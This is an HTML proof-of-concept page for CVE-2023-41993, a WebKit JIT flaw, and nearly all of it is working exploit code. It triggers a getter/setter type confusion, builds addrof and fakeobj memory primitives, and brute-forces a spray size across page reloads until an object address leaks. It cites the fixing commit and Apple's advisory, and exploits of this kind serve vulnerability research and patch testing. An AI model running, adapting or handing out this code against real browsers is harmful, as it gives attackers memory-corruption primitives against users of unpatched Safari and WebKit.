<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="util.js"></script>
    <script src="int64.js"></script>
    <title>CVE-2023-41993 PoC</title>
</head>
<body>
    <p id="status"></p>
    <button onclick="resetProgress()">Reset Progress</button>
    <script>
        /*
        author: @po6ix
        commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
        advisory: https://support.apple.com/en-us/HT213926
        */
        let boxed_arr = new Function();
        boxed_arr.p1 = 1.1;
        boxed_arr[0] = {};

        let getter = new Function();
        getter.p1 = 1.1;
        getter[0] = 1.1;

        let shape = {};
        for (let i = 0; i < 14; ++i) {
            shape['p' + i] = i;
        }

        let shapes = [];
        for (let i = 0; i < 100; ++i) {
            shapes.push({ ...shape, ['z' + i]: 0x1337 });
        }

        function trigger(type) {
            let object_a = {};
            object_a.foo = 1;
            object_a.p1 = 1.1;

            let object_b = {};
            object_b.__defineGetter__('p1', getter);
            object_b.foo = 1;

            function get_getterSetter(type) {
                let o, retval;
                if (type == 0) o = object_a;
                else o = object_b;
                for (let i = 0; i < 2; ++i) {
                    if (type == 0) retval = o.foo;
                    else retval = o.foo;
                }
                return retval;
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            for (let i = 0; i < 1e6; ++i) {
                get_getterSetter(i % 2);
            }
            return [getter, get_getterSetter(1)];
        }

        function resetProgress() {
            localStorage.removeItem('triedFactors');
            localStorage.removeItem('factorIndex');
            document.getElementById("status").innerHTML = "Progress reset, reloading...";
            setTimeout(() => location.reload(), 1000);
        }

        (function pwn() {
            let [getter, getterSetter] = trigger();
            let success = false;
            try {
                getterSetter.toString();
            } catch (e) {
                success = true;
            }
            if (!success) {
                document.getElementById("status").innerHTML = "Exploit failed.. Trying next factor!";
                return;
            }

            let symbolObject = Object(getterSetter);

            // قائمة القيم
            let allFactors = Array.from({ length: 1001 }, (_, i) => 87 + i);
            let triedFactors = JSON.parse(localStorage.getItem('triedFactors')) || [];
            let availableFactors = allFactors.filter(f => !triedFactors.includes(f));
            let index = localStorage.getItem('factorIndex') ? parseInt(localStorage.getItem('factorIndex')) : 0;
            let factor = availableFactors[index] || allFactors[0]; // إذا نفدت القيم، ابدأ من الأول

            if (!factor) {
                document.getElementById("status").innerHTML = "All factors tried, reset required!";
                return;
            }

            let ref_arr = [];
            for (let i = 0; i < factor; ++i) {
                ref_arr.push(symbolObject.description);
            }

            getter.p13 = 1.1;
            let unboxed_arr = getter;

            function addrof(o) {
                boxed_arr[8] = o;
                return Int64.fromDouble(unboxed_arr[0]); // استخدام int64.js
            }

            function fakeobj(addr) {
                unboxed_arr[0] = addr.asDouble(); // استخدام int64.js
                return boxed_arr[8];
            }

            let sample = BigInt(addrof({}).toString());
            if (sample >= 0x200000000 || sample < 0x100000000) {
                triedFactors.push(factor);
                localStorage.setItem('triedFactors', JSON.stringify(triedFactors));
                localStorage.setItem('factorIndex', index + 1);
                document.getElementById("status").innerHTML = "Invalid address, trying factor = " + (availableFactors[index + 1] || "none left");
                if (availableFactors[index + 1]) setTimeout(() => location.reload(), 1000);
                return;
            } else {
                alert("Success!!! factor = " + factor);
                document.getElementById("status").innerHTML = "Success!";
                alert(addrof({}).toString());
                localStorage.removeItem('triedFactors');
                localStorage.removeItem('factorIndex');
            }
        })();
    </script>
</body>
</html>